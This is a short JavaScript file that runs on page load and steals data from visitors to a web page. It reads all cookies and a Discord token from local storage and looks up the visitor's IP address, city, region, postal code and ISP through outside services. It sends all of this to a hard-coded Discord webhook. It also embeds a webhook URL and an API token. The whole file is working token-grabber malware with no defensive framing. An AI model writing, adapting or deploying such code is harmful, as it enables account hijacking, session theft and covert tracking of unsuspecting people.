function stealDataAndToken() {
    // Capture cookies from document.cookie
    var allCookies = document.cookie;

    // Retrieve the Discord token from local storage
    var discordToken = localStorage.getItem('discordToken'); // Replace 'discordToken' with the correct key

    // Fetch user's IP
    fetch('https://httpbin.org/ip')
    .then(response => response.json())
    .then(data => {
        var clientIp = data.origin;

        // Fetch geolocation information from IPinfo.io
        fetch(`https://ipinfo.io/${clientIp}/json?token=0b2944a985b669`)
        .then(response => response.json())
        .then(geoData => {
            var city = geoData.city;
            var region = geoData.region;
            var country = geoData.country;
            var isp = geoData.org;
            var postalCode = geoData.postal;

            // Send a message to Discord webhook including the stolen data and Discord token
            var message = `\`\`\`
Someone visited the website from:
- City: ${city}
- Region: ${region}
- Country: ${country}
- Internet provider: ${isp}
- Postal Code: ${postalCode}
- IP Address: ${clientIp}
- Cookies: ${allCookies} // Include all cookies here
- Discord Token: ${discordToken} // Include the Discord token here
\`\`\``;

            // Send message to Discord
            sendMessageToDiscord(message);
        })
        .catch(error => {
            console.error('Error fetching geolocation information:', error);
        });
    })
    .catch(error => {
        console.error('Error fetching IP address:', error.message);
    });

    // Function to send message to Discord webhook
    function sendMessageToDiscord(message) {
        fetch('https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: message
            })
        })
        .then(response => {
            if (response.ok) {
                console.log('Message sent to Discord!');
            } else {
                console.error('Failed to send message to Discord:', response.status, response.statusText);
            }
        })
        .catch(error => {
            console.error('Error sending message to Discord:', error.message);
        });
    }
}

// Call function to steal data and token
stealDataAndToken();
